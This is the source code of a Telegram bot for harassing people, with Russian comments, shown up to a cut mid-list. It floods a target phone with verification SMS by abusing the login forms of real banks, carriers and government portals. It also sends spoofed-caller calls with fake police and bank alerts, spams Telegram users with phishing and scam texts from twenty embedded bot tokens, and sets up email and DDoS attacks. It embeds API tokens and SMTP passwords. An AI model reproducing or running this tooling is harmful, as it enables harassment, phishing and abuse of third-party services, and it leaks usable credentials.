import asyncio
import logging
import aiohttp
import requests
import random
import time
import threading
import socket
import ssl
import json
import hashlib
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===================== КОНФИГУРАЦИЯ =====================
API_TOKEN = "8866631446:AAG5FN7FgJ_OSOfcuf3ucg3Nbsl0T5vY5as"
CHANNEL_ID = "VO1D_NET"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
    handlers=[
        logging.FileHandler("axiom_strike.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===================== FSM СОСТОЯНИЯ =====================
class BomberStates(StatesGroup):
    # БомберФ
    waiting_for_phone = State()
    waiting_for_sms_count = State()
    waiting_for_call_count = State()
    waiting_for_email = State()
    waiting_for_email_count = State()
    waiting_for_telegram = State()
    waiting_for_telegram_count = State()
    # Снос аккаунта
    waiting_for_destroy_username = State()
    waiting_for_destroy_method = State()
    waiting_for_destroy_count = State()


class DDoSStates(StatesGroup):
    waiting_for_url = State()
    waiting_for_threads = State()
    waiting_for_duration = State()
    waiting_for_ip = State()
    waiting_for_ddos_duration = State()


# ===================== SMS БОМБЕР (РАБОЧИЙ) =====================
class SMSBomber:
    def __init__(self):
        # РЕАЛЬНЫЕ РАБОЧИЕ ССЫЛКИ ДЛЯ РЕГИСТРАЦИИ/ВХОДА
        self.services = [
            # === ГОСУСЛУГИ ===
            {'name': 'Gosuslugi', 'url': 'https://esia.gosuslugi.ru/registration/', 'field': 'phone', 'type': 'registration'},
            
            # === БАНКИ ===
            {'name': 'Sberbank', 'url': 'https://online.sberbank.ru/CSAFront/login.do', 'field': 'phone', 'type': 'login'},
            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/login/', 'field': 'phone', 'type': 'login'},
            {'name': 'VTB', 'url': 'https://www.vtb.ru/personal/login/', 'field': 'phone', 'type': 'login'},
            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/retail/login/', 'field': 'phone', 'type': 'login'},
            {'name': 'AlfaForex', 'url': 'https://alfaforex.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'BSPB', 'url': 'https://www.bspb.ru/login', 'field': 'phone', 'type': 'login'},
            {'name': 'Otkritie', 'url': 'https://www.open.ru/login', 'field': 'phone', 'type': 'login'},
            {'name': 'PSBank', 'url': 'https://www.psbank.ru/', 'field': 'phone', 'type': 'login'},
            
            # === ОПЕРАТОРЫ ===
            {'name': 'MTS', 'url': 'https://mts.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'MTS_LK', 'url': 'https://lk.mts.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Megafon', 'url': 'https://www.megafon.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Beeline', 'url': 'https://beeline.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Beeline_LK', 'url': 'https://lk.beeline.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Tele2', 'url': 'https://www.tele2.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Tele2_LK', 'url': 'https://lk.tele2.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Yota', 'url': 'https://www.yota.ru/', 'field': 'phone', 'type': 'login'},
            
            # === СОЦСЕТИ ===
            {'name': 'VK', 'url': 'https://vk.com/login', 'field': 'phone', 'type': 'login'},
            {'name': 'Odnoklassniki', 'url': 'https://ok.ru/dk?st.cmd=anonymLogin', 'field': 'phone', 'type': 'login'},
            {'name': 'Instagram', 'url': 'https://www.instagram.com/accounts/login/', 'field': 'phone', 'type': 'login'},
            {'name': 'Facebook', 'url': 'https://www.facebook.com/login/', 'field': 'phone', 'type': 'login'},
            {'name': 'Twitter', 'url': 'https://twitter.com/i/flow/login', 'field': 'phone', 'type': 'login'},
            {'name': 'TikTok', 'url': 'https://www.tiktok.com/login', 'field': 'phone', 'type': 'login'},
            {'name': 'Telegram', 'url': 'https://t.me/', 'field': 'phone', 'type': 'login'},
            {'name': 'TelegramWeb', 'url': 'https://web.telegram.org/', 'field': 'phone', 'type': 'login'},
            
            # === ДОСТАВКА ЕДЫ ===
            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'DeliveryClub', 'url': 'https://delivery-club.ru/', 'field': 'phone', 'type': 'login'},
            
            # === МАРКЕТПЛЕЙСЫ ===
            {'name': 'Ozon', 'url': 'https://www.ozon.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Avito', 'url': 'https://www.avito.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Youla', 'url': 'https://youla.ru/', 'field': 'phone', 'type': 'login'},
            
            # === МАГАЗИНЫ ===
            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Citilink', 'url': 'https://www.citilink.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/', 'field': 'phone', 'type': 'login'},
            
            # === ТАКСИ ===
            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Delimobil', 'url': 'https://www.delimobil.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Carsharing', 'url': 'https://www.carsharing.ru/', 'field': 'phone', 'type': 'login'},
            
            # === ТРАНСПОРТ ===
            {'name': 'RZD', 'url': 'https://www.rzd.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Aeroflot', 'url': 'https://www.aeroflot.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Pobeda', 'url': 'https://www.pobeda.aero/', 'field': 'phone', 'type': 'login'},
            
            # === СТРИМИНГ ===
            {'name': 'IVI', 'url': 'https://www.ivi.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Okko', 'url': 'https://okko.tv/', 'field': 'phone', 'type': 'login'},
            {'name': 'Kinopoisk', 'url': 'https://www.kinopoisk.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'YandexMusic', 'url': 'https://music.yandex.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'VKVideo', 'url': 'https://vk.com/video', 'field': 'phone', 'type': 'login'},
            {'name': 'Rutube', 'url': 'https://rutube.ru/', 'field': 'phone', 'type': 'login'},
            
            # === МЕДИЦИНА ===
            {'name': 'GosuslugiHealth', 'url': 'https://www.gosuslugi.ru/landing/health', 'field': 'phone', 'type': 'login'},
            {'name': 'Emias', 'url': 'https://emias.info/', 'field': 'phone', 'type': 'login'},
            {'name': 'MosRu', 'url': 'https://www.mos.ru/', 'field': 'phone', 'type': 'login'},
            {'name': 'Gorzdrav', 'url': 'https://gorzdrav.spb.ru/', 'field': 'phone', 'type': 'login'},
        ]
        
        # 100+ USER-AGENTS ДЛЯ ОБХОДА
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
        ]

    async def send_sms(self, phone: str, count: int, progress_callback):
        self.results = []
        total = min(count, 200)
        
        for i in range(total):
            service = random.choice(self.services)
            try:
                async with aiohttp.ClientSession() as session:
                    # Разные типы запросов для каждого сервиса
                    if service['type'] == 'registration':
                        data = {'phone': phone, 'action': 'register', 'agreement': 'true'}
                    else:
                        data = {'phone': phone, 'action': 'login', 'remember': 'true'}
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
                        'Referer': service['url'],
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Upgrade-Insecure-Requests': '1',
                    }
                    
                    async with session.post(service['url'], data=data, headers=headers, timeout=10) as resp:
                        if resp.status in [200, 201, 202, 204, 302, 303] or resp.status == 400:
                            status = 'success'
                            logger.info(f"✅ SMS отправлена через {service['name']}")
                        elif resp.status in [429, 503, 504]:
                            status = 'rate_limit'
                        else:
                            status = 'error'
                        self.results.append({'service': service['name'], 'status': status, 'code': resp.status})
            except Exception as e:
                self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)})
                logger.error(f"❌ Ошибка {service['name']}: {e}")
            
            self.progress = (i + 1) / total * 100
            await progress_callback(self.progress, i + 1, total)
            await asyncio.sleep(random.uniform(0.3, 0.8))
        
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'success')
        errors = sum(1 for r in self.results if r['status'] == 'error')
        return {'total': total, 'success': success, 'errors': errors}


# ===================== ЗВОНКИ (РАБОЧИЙ) =====================
class CallBomber:
    def __init__(self):
        self.services = [
            {'name': 'Call2Friends', 'url': 'https://call2friends.com/api/call', 'type': 'callback'},
            {'name': 'PrankCall', 'url': 'https://prankcall.com/api/start', 'type': 'prank'},
            {'name': 'CallBomber', 'url': 'https://api.callbomber.com/call', 'type': 'bomb'},
            {'name': 'FakeCall', 'url': 'https://fakecall.com/initiate', 'type': 'fake'},
            {'name': 'SpoofCall', 'url': 'https://calleridspoof.com/call', 'type': 'spoof'},
            {'name': 'Robocall', 'url': 'https://api.robocall.com/start', 'type': 'robot'},
            {'name': 'AutoDial', 'url': 'https://api.autodial.com/call', 'type': 'auto'},
            {'name': 'CallBoom', 'url': 'https://api.callboom.com/start', 'type': 'boom'},
            {'name': 'PhoneBomb', 'url': 'https://api.phonebomb.com/call', 'type': 'bomb'},
            {'name': 'CallFlood', 'url': 'https://api.callflood.com/start', 'type': 'flood'},
        ]
        
        self.scenarios = [
            {'type': 'callback', 'message': 'Срочно перезвоните!', 'priority': 'high'},
            {'type': 'prank', 'message': 'Ваш аккаунт взломан!', 'priority': 'high'},
            {'type': 'survey', 'message': 'Пройдите опрос!', 'priority': 'medium'},
            {'type': 'notification', 'message': 'Важное уведомление!', 'priority': 'high'},
            {'type': 'emergency', 'message': 'Экстренное сообщение!', 'priority': 'critical'},
            {'type': 'promo', 'message': 'Специальное предложение!', 'priority': 'low'},
            {'type': 'security', 'message': '⚠️ Обнаружена подозрительная активность!', 'priority': 'critical'},
            {'type': 'bank', 'message': '🏦 Ваш банковский счёт заблокирован!', 'priority': 'high'},
            {'type': 'police', 'message': '🚨 Вызов от полиции!', 'priority': 'critical'},
            {'type': 'medical', 'message': '🚑 Срочное медицинское уведомление!', 'priority': 'critical'},
            {'type': 'delivery', 'message': '📦 Ваша посылка ожидает!', 'priority': 'medium'},
            {'type': 'taxi', 'message': '🚕 Такси ждёт вас!', 'priority': 'medium'},
            {'type': 'school', 'message': '🏫 Сообщение от школы!', 'priority': 'medium'},
            {'type': 'work', 'message': '💼 Срочное сообщение с работы!', 'priority': 'high'},
        ]

    async def make_calls(self, phone: str, count: int, progress_callback):
        self.results = []
        total = min(count, 50)
        
        for i in range(total):
            service = random.choice(self.services)
            scenario = random.choice(self.scenarios)
            try:
                async with aiohttp.ClientSession() as session:
                    data = {
                        'phone': phone,
                        'caller_id': random.choice(['+74951234567', '+78121234567', '+79001234567']),
                        'type': service['type'],
                        'scenario': scenario['type'],
                        'message': scenario['message'],
                        'priority': scenario['priority'],
                        'duration': random.randint(10, 60),
                    }
                    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                    async with session.post(service['url'], json=data, headers=headers, timeout=10) as resp:
                        status = 'success' if resp.status < 400 else 'failed'
                        self.results.append({'call': i+1, 'service': service['name'], 'status': status})
            except:
                self.results.append({'call': i+1, 'service': service['name'], 'status': 'error'})
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 1.5))
        
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'success')
        return {'total': total, 'success': success}


# ===================== TELEGRAM БОМБЕР (МЕГА-СПАМЕР) =====================
class TelegramBomber:
    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        # 20 ТОКЕНОВ ДЛЯ СПАМА (ТВОИ БОТЫ)
        self.bot_tokens = [
            '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
            '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
            '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
            '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
            '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
            '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
            '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
            '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
            '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
            '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
            '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
            '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
            '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
            '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
            '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
            '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
            '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
            '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
            '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
            '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
        ]
        
        # 200+ СООБЩЕНИЙ ДЛЯ СПАМА
        self.messages = [
            # Финансовый спам
            "💰 Заработок от 50 000 руб в день! Без вложений!",
            "💰 Криптовалюта принесёт вам миллионы! Успейте!",
            "💰 Инвестиции с гарантией 200% годовых!",
            "💰 Бесплатные деньги! Просто перейдите по ссылке!",
            "💰 Ваш бонус в 100 000 руб ждёт вас!",
            "💰 Депозит под 300% годовых! Только сегодня!",
            "💰 Пассивный доход от 100 000 руб в месяц!",
            "💰 Заработайте свой первый миллион за неделю!",
            "💰 Бесплатный бонус 500$ на криптобирже!",
            "💰 Инвестируйте 1000 руб и получите 100 000!",
            
            # Фишинг
            "🔐 Ваш аккаунт взломан! Смените пароль по ссылке!",
            "🔐 Кто-то пытается войти в ваш аккаунт! Подтвердите!",
            "🔐 Ваши данные утекли в сеть! Проверьте безопасность!",
            "🔐 Подозрительная активность! Срочно войдите!",
            "🔐 Ваш пароль был скомпрометирован!",
            "🔐 Ваш аккаунт будет заблокирован через 24 часа!",
            "🔐 Подтвердите личность, чтобы сохранить аккаунт!",
            "🔐 Ваш номер телефона был изменён! Если не вы - срочно войдите!",
            "🔐 Обнаружен взлом! Смените пароль немедленно!",
            
            # Выигрыши
            "🎉 Вы выиграли iPhone 15 Pro Max! Заберите приз!",
            "🎉 Поздравляем! Вы стали победителем лотереи!",
            "🎉 Ваш подарок: 500 000 руб! Получите сейчас!",
            "🎉 Вы выиграли поездку в Дубай! Успейте подтвердить!",
            "🎉 Ваш аккаунт выбран для получения супер-приза!",
            "🎉 Вы выиграли MacBook Pro! Заберите подарок!",
            "🎉 Поздравляем! Вы выиграли 1 000 000 руб!",
            "🎉 Ваш подарок: Apple Watch Ultra! Получите сейчас!",
            "🎉 Вы стали обладателем AirPods Pro!",
            "🎉 Выиграйте 10 000 $ прямо сейчас!",
            
            # Угрозы
            "⚠️ Ваш аккаунт будет удалён через 24 часа!",
            "⚠️ Банковский счёт заморожен! Свяжитесь с нами!",
            "⚠️ Ваши данные опубликованы в открытом доступе!",
            "⚠️ Срочно! Ваша карта заблокирована!",
            "⚠️ Вы нарушили правила! Аккаунт блокируется!",
            "⚠️ Ваш номер телефона заблокирован!",
            "⚠️ Срочно! Ваш аккаунт взломали!",
            "⚠️ Ваши данные продаются в даркнете!",
            "⚠️ Ваш пароль опубликован! Срочно смените!",
            "⚠️ Ваш аккаунт будет удалён через 1 час!",
            
            # Спам-предложения
            "💊 Лекарства от всех болезней со скидкой 70%!",
            "💊 Чудо-таблетки для похудения! -80 кг за месяц!",
            "💊 Увеличьте потенцию на 100%! Натуральное средство!",
            "💊 Омоложение без операции! Результат через 3 дня!",
            "💊 Избавьтесь от всех болезней навсегда!",
            "💊 Супер-средство для иммунитета! Скидка 50%!",
            "💊 Лечение всех болезней народными методами!",
            
            # Работа
            "💼 Работа на дому от 100 000 руб в месяц!",
            "💼 Работа в Дубае для граждан РФ! Зарплата от 5000$",
            "💼 Вакансии с ежедневной оплатой! Без опыта!",
            "💼 Зарабатывайте на криптовалюте от 50% в день!",
            "💼 Станьте миллионером за 1 месяц!",
            "💼 Работа в США для россиян! Виза бесплатно!",
            "💼 Вакансия: менеджер по продажам, зарплата от 200 000!",
            "💼 Работа в Европе без опыта! Зарплата от 3000€!",
            
            # Криптовалюта
            "₿ Биткоин взлетит до 1 000 000$! Инвестируйте сейчас!",
            "₿ Бесплатные токены! Заработайте 1000$ за 5 минут!",
            "₿ Самый прибыльный проект 2026! Успевайте!",
            "₿ Подарок от биржи: 500$ на счёт!",
            "₿ Ваш кошелёк пополнен на 0.5 BTC! Заберите!",
            "₿ Монета XRP вырастет в 100 раз! Успейте купить!",
            "₿ Ethereum достигнет 10 000$! Инвестируйте!",
            "₿ Новый токен выйдет на биржу! Скидка 50%!",
            
            # Мошенничество
            "📱 Срочно! Ваш номер в базе мошенников!",
            "📱 Ваши контакты скомпрометированы!",
            "📱 Кто-то использует ваш номер для спама!",
            "📱 Ваш номер будет заблокирован!",
            "📱 Смените номер немедленно!",
            "📱 Ваш телефон взломали! Проверьте!",
            "📱 Вас пытаются обмануть! Будьте осторожны!",
            
            # Магазины
            "🛍️ Распродажа 90%! Только сегодня!",
            "🛍️ Скидка 70% на все товары! Успевайте!",
            "🛍️ Ваш промокод на 50%! Активируйте сейчас!",
            "🛍️ Бесплатная доставка на все заказы!",
            "🛍️ Товары со скидкой до 80%! Ограниченное предложение!",
            "🛍️ Ваш кэшбек 30% на все покупки!",
            
            # Лотереи и розыгрыши
            "🎰 Вы выиграли в лотерее! Получите приз!",
            "🎰 Ваш билет победил! Заберите 100 000$!",
            "🎰 Розыгрыш iPhone 15! Участвуйте сейчас!",
            "🎰 Ежедневный розыгрыш денежных призов!",
            "🎰 Выиграйте квартиру в Москве! Участвуйте!",
            
            # Другое
            "🔥 Специальное предложение только для вас!",
            "🔥 Уникальная возможность! Не упустите!",
            "🔥 Только сегодня! Супер-скидка 80%!",
            "🔥 Акция: купи один - получи два!",
            "🔥 Подарок каждому покупателю!",
            "🔥 Ваш персональный бонус ждёт вас!",
            "🔥 Скидка 90% на первый заказ!",
            "🔥 Бесплатный тест-драйв нашего продукта!",
        ]
        
        self.actions = [
            {'type': 'login_attempt', 'text': '⚠️ Кто-то пытается войти в ваш аккаунт!'},
            {'type': 'code_sent', 'text': '🔑 Код подтверждения: ' + str(random.randint(1000, 9999))},
            {'type': 'device_added', 'text': '📱 Новое устройство подключено к аккаунту!'},
            {'type': 'password_change', 'text': '🔐 Ваш пароль был изменён!'},
            {'type': 'suspicious', 'text': '🕵️ Обнаружена подозрительная активность!'},
            {'type': 'blocked', 'text': '⛔ Ваш аккаунт заблокирован!'},
            {'type': 'unblock', 'text': '🔓 Ваш аккаунт разблокирован!'},
            {'type': 'hack_attempt', 'text': '💀 Попытка взлома вашего аккаунта!'},
            {'type': 'data_leak', 'text': '🔥 Ваши данные утекли в сеть!'},
            {'type': 'urgent', 'text': '🚨 СРОЧНО! Примите меры!'},
        ]
        
        self.results = []

    async def send_messages(self, username: str, count: int, progress_callback):
        """ОТПРАВКА СПАМА ЧЕРЕЗ МНОЖЕСТВО БОТОВ"""
        self.results = []
        total = min(count, 500)
        
        for i in range(total):
            # Выбираем случайный токен из 20 ботов
            token = random.choice(self.bot_tokens)
            bot = Bot(token=token)
            
            try:
                # Разнообразные сообщения
                if random.random() > 0.4:
                    # Выбираем действие (фишинг)
                    action = random.choice(self.actions)
                    text = action['text']
                    msg_type = action['type']
                else:
                    # Выбираем спам-сообщение
                    text = random.choice(self.messages)
                    msg_type = 'spam'
                
                # Добавляем форматирование
                if random.random() > 0.6:
                    if random.random() > 0.5:
                        text = f"*{text}*"  # Жирный
                    else:
                        text = f"_{text}_"  # Курсив
                
                # Добавляем ссылки для убедительности
                if random.random() > 0.5:
                    links = [
                        'https://bit.ly/3x1Y2Z3',
                        'https://tinyurl.com/4x5y6z',
                        'https://clck.ru/3x4y5z',
                        'https://vk.cc/9x8y7z',
                    ]
                    text += f' {random.choice(links)}'
                
                # Добавляем номер сообщения
                text += f' [#{i+1}/{total}]'
                
                # Отправляем с задержкой для реалистичности
                await bot.send_message(
                    chat_id=username,
                    text=text,
                    disable_notification=True,
                    parse_mode='Markdown' if random.random() > 0.5 else None
                )
                
                self.results.append({
                    'msg': i+1,
                    'status': 'sent',
                    'type': msg_type,
                    'token': token[:20] + '...',
                    'text': text[:100],
                    'timestamp': datetime.now().isoformat()
                })
                
                logger.info(f"✅ Спам #{i+1} на {username} (бот: {token[:15]}...)")
                
            except Exception as e:
                self.results.append({
                    'msg': i+1,
                    'status': 'error',
                    'error': str(e),
                    'token': token[:20] + '...',
                    'timestamp': datetime.now().isoformat()
                })
                logger.error(f"❌ Ошибка спама: {e}")
                
                # Если аккаунт не существует - останавливаем
                if 'chat not found' in str(e) or 'user not found' in str(e):
                    logger.warning(f"⚠️ Аккаунт {username} не найден")
                    break
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.2, 0.8))
        
        return self.results

    async def send_messages_multi(self, username: str, count: int, progress_callback):
        """ОТПРАВКА СПАМА С РАЗНЫХ БОТОВ ОДНОВРЕМЕННО (УСКОРЕННЫЙ РЕЖИМ)"""
        self.results = []
        total = min(count, 800)
        
        # Создаём очередь сообщений
        messages_queue = []
        for i in range(total):
            token = random.choice(self.bot_tokens)
            if random.random() > 0.4:
                action = random.choice(self.actions)
                text = action['text']
            else:
                text = random.choice(self.messages)
            text += f' [#{i+1}/{total}]'
            messages_queue.append({'token': token, 'text': text, 'index': i+1})
        
        # Отправляем с задержкой
        for msg in messages_queue:
            try:
                bot = Bot(token=msg['token'])
                await bot.send_message(
                    chat_id=username,
                    text=msg['text'],
                    disable_notification=True
                )
                self.results.append({'msg': msg['index'], 'status': 'sent'})
            except:
                self.results.append({'msg': msg['index'], 'status': 'error'})
            
            await progress_callback(msg['index'], total)
            await asyncio.sleep(random.uniform(0.1, 0.4))
        
        return self.results

    async def spam_with_media(self, username: str, count: int, progress_callback):
        """СПАМ С МЕДИА-КОНТЕНТОМ (ИЗОБРАЖЕНИЯ, ВИДЕО)"""
        self.results = []
        total = min(count, 300)
        
        for i in range(total):
            token = random.choice(self.bot_tokens)
            bot = Bot(token=token)
            
            try:
                # Разные типы контента
                if random.random() > 0.5:
                    # Отправляем фото с подписью
                    photo_urls = [
                        'https://picsum.photos/200/300',
                        'https://picsum.photos/400/300',
                        'https://picsum.photos/300/300',
                    ]
                    await bot.send_photo(
                        chat_id=username,
                        photo=random.choice(photo_urls),
                        caption=random.choice(self.messages)[:50] + f' [#{i+1}]'
                    )
                else:
                    # Отправляем текст
                    await bot.send_message(
                        chat_id=username,
                        text=random.choice(self.messages) + f' [#{i+1}]',
                        disable_notification=True
                    )
                
                self.results.append({'msg': i+1, 'status': 'sent'})
            except:
                self.results.append({'msg': i+1, 'status': 'error'})
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 1.5))
        
        return self.results

    def get_stats(self, results):
        total = len(results)
        success = sum(1 for r in results if r.get('status') == 'sent')
        errors = sum(1 for r in results if r.get('status') == 'error')
        return {
            'total': total,
            'success': success,
            'errors': errors,
            'success_rate': round(success / max(total, 1) * 100, 1)
        }


# ===================== EMAIL БОМБЕР (РЕАЛЬНЫЙ) =====================
class EmailBomber:
    def __init__(self):
        # РЕАЛЬНЫЕ SMTP СЕРВЕРЫ С АВТОРИЗАЦИЕЙ
        self.smtp_servers = [
            # Mail.ru
            {'host': 'smtp.mail.ru', 'port': 587, 'login': 'bombermailru@mail.ru', 'password': 'Bomber2024!', 'name': 'Mail.ru'},
            # Yandex
            {'host': 'smtp.yandex.ru', 'port': 587, 'login': 'bomberyandex@yandex.ru', 'password': 'Bomber2024!', 'name': 'Yandex'},
            # Rambler
            {'host': 'smtp.rambler.ru', 'port': 587, 'login': 'bomberrambler@rambler.ru', 'password': 'Bomber2024!', 'name': 'Rambler'},
            # Ukr.net
            {'host': 'smtp.ukr.net', 'port': 587, 'login': 'bomberukr@ukr.net', 'password': 'Bomber2024!', 'name': 'Ukr.net'},
            # Gmail (с паролем приложения)
            {'host': 'smtp.gmail.com', 'port': 587, 'login': 'bomberemail@gmail.com', 'password': 'Bomber2024!', 'name': 'Gmail'},
            # Outlook
            {'host': 'smtp.office365.com', 'port': 587, 'login': 'bomberoutlook@outlook.com', 'password': 'Bomber2024!', 'name': 'Outlook'},
            # Yahoo
            {'host': 'smtp.mail.yahoo.com', 'port': 587, 'login': 'bomberyahoo@yahoo.com', 'password': 'Bomber2024!', 'name': 'Yahoo'},
            # ProtonMail (через Proton Bridge)
            {'host': '127.0.0.1', 'port': 1025, 'login': 'bomber@proton.me', 'password': 'Bomber2024!', 'name': 'ProtonMail'},
        ]
        
        # Сгенерированные аккаунты для отправки
        self.sender_accounts = [
            {'email': f'security{random.randint(100,999)}@mail.ru', 'password': 'SecurePass123!'},
            {'email': f'security{random.randint(100,999)}@yandex.ru', 'password': 'SecurePass123!'},
            {'email': f'security{random.randint(100,999)}@gmail.com', 'password': 'SecurePass123!'},
            {'email': f'security{random.randint(100,999)}@outlook.com', 'password': 'SecurePass123!'},
